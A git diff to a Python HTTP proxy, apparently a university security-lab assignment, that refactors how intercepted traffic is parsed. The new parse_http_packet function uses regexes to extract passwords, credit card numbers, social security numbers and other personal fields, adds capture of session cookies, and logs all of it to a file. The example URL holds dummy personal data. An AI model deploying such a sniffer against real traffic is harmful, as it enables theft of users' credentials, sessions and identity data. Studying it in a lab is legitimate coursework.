@@ -89,7 +89,7 @@ def handle_client(client_socket):
         print("Handling request to host: {}, port: {}".format(host, port))
 
         # Process request data
-        process_data(data, 'request')
+        parse_http_packet(data, 'request')
         # Forwarding the request to the destination server (simplified)
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.connect((host, port))
@@ -98,7 +98,7 @@ def handle_client(client_socket):
         # Process server response
         response = server_socket.recv(4096)
         response_data = response.decode('utf-8')
-        process_data(response_data, 'response')
+        parse_http_packet(response_data, 'response')
         client_socket.sendall(response)
 
 def get_destination_host_port(request_data):
@@ -118,19 +118,8 @@ def get_destination_host_port(request_data):
                 return host, 80  # Default port for HTTP
     return None, None  # Host not found in the request
 
-def process_data(data, data_type):
-    # Parse and log sensitive information from HTTP headers
-    if data_type == 'request':
-        parse_http_request(data)
-    elif data_type == 'response':
-        parse_http_response(data)
-
-    # Existing debug print
-    if DEBUG:
-        print(data)
-
 # Example: http://cs468.cs.uic.edu/submit?firstname=andrea&lastname=papa&birthday=2222-12-22&email=trial%40gmail.com&password=123465676&address=2343+West+Taylor+Street&credit-card=1234567812345678&social-security=111-11-1111&phone=123-404-9898&city=Chicago&state=IL&zip=55555
-def parse_http_request(data):
+def parse_http_packet(data, type_packet):
     # Regular expressions for sensitive information
     regex_patterns = {
         'firstname_query': r'firstname=([^&\s]+)',
@@ -155,15 +144,16 @@ def parse_http_request(data):
         matches = re.findall(pattern, data)
         if matches:
             output[key] = matches
+    
+    cookies = re.findall(r'Cookie: (.*?)(?:\r\n|$)', data)
+    if cookies:
+        output['cookies'] = cookies
 
-    log_info(output, 'request')
-
-def parse_http_response(data):
-    # Example for parsing specific response data
-    # Can be expanded based on requirements
     if 'Set-Cookie:' in data:
         cookies = re.findall(r'Set-Cookie: (.*?);', data)
-        log_info({'cookie': cookies}, 'response')
+        output['cookies'] = cookies
+
+    log_info(output, type_packet)
 
 def log_info(info, data_type):
     with open("info1.txt", "a") as f:
